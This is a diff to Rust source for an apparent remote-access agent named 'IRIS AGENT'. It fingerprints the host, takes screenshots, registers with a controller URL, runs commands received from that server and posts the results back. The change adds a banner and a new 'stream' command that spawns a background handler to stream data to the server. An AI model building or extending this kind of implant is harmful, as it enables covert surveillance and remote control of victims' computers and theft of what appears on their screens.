@@ -1,9 +1,33 @@
+/*               IRIS AGENT                    */
+/*                                        XXX  */
+/*               XXXXXXXXXXX             XXXXX */
+/*          XXXXXXXXXXXXXXXXXXX           XXX  */
+/*        XXXXXXXXXXXXXXXXXXXXXX               */
+/*      XXXXXXXXX           XXXX               */
+/*     XXXXXXX                      XX         */
+/*    XXXXXX                        XXX        */
+/*   XXXXX         XXXXXXX         XXXXX       */
+/*  XXXXX       XXXXXXXXXXXXX       XXXXX      */
+/* XXXXX       XXXXXXXX    XXX       XXXXX     */
+/* XXXXX      XXXXXXXX      XXX      XXXXX     */
+/* XXXXX      XXXXXXXXX    XXXX      XXXXX     */
+/* XXXXX      XXXXXXXXXXXXXXXXX      XXXXX     */
+/* XXXXX       XXXXXXXXXXXXXXX       XXXXX     */
+/*  XXXXX       XXXXXXXXXXXXX       XXXXX      */
+/*   XXXXX         XXXXXXX         XXXXX       */
+/*    XXXXXX                     XXXXXX        */
+/*     XXXXXXX                 XXXXXXX         */
+/*      XXXXXXXXX           XXXXXXXXX          */
+/*        XXXXXXXXXXXXXXXXXXXXXXXXX            */
+/*          XXXXXXXXXXXXXXXXXXXXX              */
+/*               XXXXXXXXXXX                   */
 mod info;
 use reqwest::{get, ClientBuilder};
 use serde::{Deserialize, Serialize};
 
 mod crypt;
 mod screen;
+mod stream;
 use std::{net::IpAddr, string, time::Duration};
 
 use crate::screen::takescreen;
@@ -96,7 +120,23 @@ async fn get_local_fingerprint() -> String{
 
 }
 async fn progress(url:String,command:String,taskid:String,key:String){
-    
+    let command_clone = command.clone();
+    if command.starts_with("stream"){
+        
+        let parts:Vec<&str> = command_clone.split(",").collect();
+        if parts.len() != 3{
+            let _ = add_result(url.to_string(), key.to_string(), "not an command".to_string(), taskid.to_string()).await;
+        }
+        else {
+            let sesssion = parts[2].to_string();
+            let tys = parts[1].to_string();
+            let url_clone = url.to_string();
+            tokio::spawn(async move {
+                let _ = stream::stream_handler(tys.to_string(), sesssion.to_string(), url_clone.to_string()).await; // offline handler
+            });
+        }
+    }
+
     match command.as_str() {
         "ping" => {
             let _ = add_result(url.to_string(), key, "pong".to_string(), taskid.to_string()).await;
@@ -181,7 +221,7 @@ async fn progress(url:String,command:String,taskid:String,key:String){
 
         }
 
-        
+
         "🎅" => {
             let _ = add_result(url.to_string(), key, "santa santa claus santa santa".to_string(), taskid.to_string()).await;
         }
@@ -229,7 +269,7 @@ async fn advertise(url: String,key:String) -> bool{
     };
     let tex = match res.text().await{
         Ok(tex) => tex,
-        Err(ett) => {
+        Err(_) => {
             log("Error: Invalid Response by Server in Adverticeing process").await; 
             return false;
         }
